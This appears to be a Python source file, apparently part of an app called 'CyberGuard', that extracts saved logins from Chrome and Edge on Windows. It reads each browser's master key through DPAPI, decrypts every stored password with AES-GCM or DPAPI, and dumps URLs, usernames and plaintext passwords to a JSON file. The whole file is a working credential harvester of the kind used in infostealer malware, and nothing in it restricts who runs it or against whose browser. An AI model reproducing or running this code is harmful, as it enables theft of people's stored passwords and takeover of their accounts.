import os
import json
import base64
import sqlite3
import shutil
from pathlib import Path
from Cryptodome.Cipher import AES  # Make sure this is Cryptodome
import win32crypt 

# --- DYNAMIC CONFIG (Works for any user) ---
APP_DATA_PATH = Path(os.getenv("LOCALAPPDATA"))
TEMP_DB_DIR = APP_DATA_PATH / "CyberGuard" / "Temp"

BROWSERS = {
    "chrome": APP_DATA_PATH / "Google" / "Chrome" / "User Data" / "Default" / "Login Data",
    "edge": APP_DATA_PATH / "Microsoft" / "Edge" / "User Data" / "Default" / "Login Data"
}

LOCAL_STATE_PATHS = {
    "chrome": APP_DATA_PATH / "Google" / "Chrome" / "User Data" / "Local State",
    "edge": APP_DATA_PATH / "Microsoft" / "Edge" / "User Data" / "Local State"
}

def get_master_key(local_state_path):
    """Retrieve and decrypt Chrome/Edge master key from Local State."""
    if not local_state_path.exists():
        return None

    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]  # remove DPAPI prefix
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def decrypt_password(password, master_key):
    """Decrypt Chrome/Edge saved password using AES-GCM or DPAPI."""
    try:
        # v10/v11+ uses AES-GCM scheme
        if password[:3] == b'v10' or password[:3] == b'v11': 
            iv = password[3:15]
            payload = password[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            # Decrypt and remove 16-byte auth tag
            decrypted = cipher.decrypt(payload)[:-16].decode("utf-8", errors="ignore")
            return decrypted
        else:  # Older DPAPI scheme
            return win32crypt.CryptUnprotectData(password, None, None, None, 0)[1].decode("utf-8", errors="ignore")
    except Exception:
        return "" # Return empty string on any error

def extract_browser_passwords(browser, login_db_path, local_state_path):
    """Extract saved logins (URL, username, password) from a browser."""
    if not login_db_path.exists():
        return []

    # Copy DB because browser locks it
    # We use a unique temp name to avoid conflicts
    temp_db = TEMP_DB_DIR / f"temp_{browser}.db"
    shutil.copyfile(login_db_path, temp_db)

    master_key = get_master_key(local_state_path)
    logins = []

    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()

    try:
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        for url, username, password in cursor.fetchall():
            if not url or not username:
                continue
            
            decrypted_password = decrypt_password(password, master_key) if master_key else ""
            
            # --- FILTER: Only add if password is NOT empty ---
            if decrypted_password:
                logins.append({
                    "url": url,
                    "username": username,
                    "password": decrypted_password,
                    "source": browser
                })
    except Exception as e:
        print(f"[!] Error extracting from {browser}: {e}")
    finally:
        conn.close()
        os.remove(temp_db)

    return logins

def extract_all_passwords():
    """
    Main function to run the extraction for all supported browsers.
    This is the *only* function our app will call.
    """
    os.makedirs(TEMP_DB_DIR, exist_ok=True)
    all_logins = []

    for browser, db_path in BROWSERS.items():
        print(f"[*] Extracting from {browser.title()}...")
        local_state = LOCAL_STATE_PATHS[browser]
        logins = extract_browser_passwords(browser, db_path, local_state)
        all_logins.extend(logins)
        print(f"[✓] {len(logins)} entries found in {browser.title()}")

    return all_logins

if __name__ == "__main__":
    # This part is just for testing
    print("Starting browser password extraction...")
    logins_list = extract_all_passwords()
    print(f"\n[+] Total entries found (with passwords): {len(logins_list)}")
    
    # Save to a JSON file *for testing only*
    TEST_OUTPUT_FILE = TEMP_DB_DIR / "logins_test.json"
    with open(TEST_OUTPUT_FILE, "w", encoding="utf-8") as f:
        json.dump(logins_list, f, indent=4)
    print(f"Test file saved to: {TEST_OUTPUT_FILE}")